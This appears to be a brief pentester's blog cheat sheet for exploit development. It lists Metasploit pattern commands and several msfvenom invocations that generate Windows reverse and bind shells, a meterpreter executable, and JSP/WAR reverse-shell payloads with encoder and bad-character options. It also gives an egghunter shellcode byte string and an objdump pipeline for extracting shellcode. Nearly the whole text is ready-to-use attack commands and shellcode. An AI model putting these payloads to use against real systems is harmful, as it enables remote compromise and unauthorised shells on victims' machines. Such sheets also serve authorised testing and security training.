---
layout: post
title: Exploit Dev Command Sheet
---

<div class="message"> 
Hey, thought of adding few useful commands that I've been using frequently during pentest engagments and exploit developments.
</div>

### Metasploit Commands
* MSF unique pattern 

> Create new pattern to find the offset, useful during Exploit Dev.


{% highlight js %}
cd /usr/share/metasploit-framework/tools/
./pattern_create -l 2000
./pattern_offset -q PATTERN
{% endhighlight %}


* MSFvenom

> Arch(-a), Platform(- -platform), Payload(-p), encoder(-e), 
Encode-Iteration(-i), Bad-chars(-b), Output Format(-f), OutPut-File(-o)


{% highlight js %}
msfvenom -l payloads
msfvenom --help-formats

msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=<UR IP> LPORT=<PORT> -e x86/shikata_ga_nai -b '\x00\x0a\x0d' -i 2 -f python

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<UR IP> LPORT=<PORT> -e x86/shikata_ga_nai  -b '\x00\x0a\x0d' -f exe -o myshell.exe

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<UR IP> LPORT=<Port> -f raw > jspshell.jsp

msfvenom -p java/jsp_shell_reverse_tcp LHOST=<UR IP> LPORT=<Port> -f war > myshell.war

msfvenom -p windows/shell_bind_tcp LPORT=4321 -e x86/shikata_ga_nai -b "\x00\x0d\x0a" -i 3 -f c
{% endhighlight %}

-----

* EggHunter

> Basically this will loop through the memory and searches for the string â€œw00t"(\x77\x30\x30\x74). Once it finds the string or the egg "w00t" one after the other "w00tw00t" in memory, it will break out of the loop and continous to execute the shellcode placed immediatley after "w00tw00t".


{% highlight js %}
Egg "w00t" = "\x77\x30\x30\x74" 

"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
{% endhighlight %}

-----

* Compiling & generate shellcode from binary

> Create a new assembly file like "myfile.nasm" and generate an object file by compiling the assembly file.
Then use "objdump" to extract the shellcode out from the generated object file "myobj.o".


{% highlight js %}
nasm -f elf32 -o myobj.o myfile.nasm

objdump -d filename.o|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
{% endhighlight %}

-----



